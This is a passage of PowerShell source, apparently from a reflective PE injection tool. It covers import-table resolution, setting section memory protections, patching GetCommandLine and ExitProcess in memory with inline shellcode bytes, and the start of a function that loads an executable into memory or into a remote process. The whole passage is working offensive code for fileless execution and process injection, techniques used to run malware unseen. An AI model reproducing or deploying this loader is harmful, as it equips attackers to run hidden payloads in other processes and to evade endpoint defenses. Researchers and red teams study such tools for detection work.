                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                Write-Verbose "Importing $ImportDllPath"
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                    #Write-Verbose "Imported $ImportDllPath to remote process"
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                    #Write-Verbose "Imported $ImportDllPath"
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                        
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

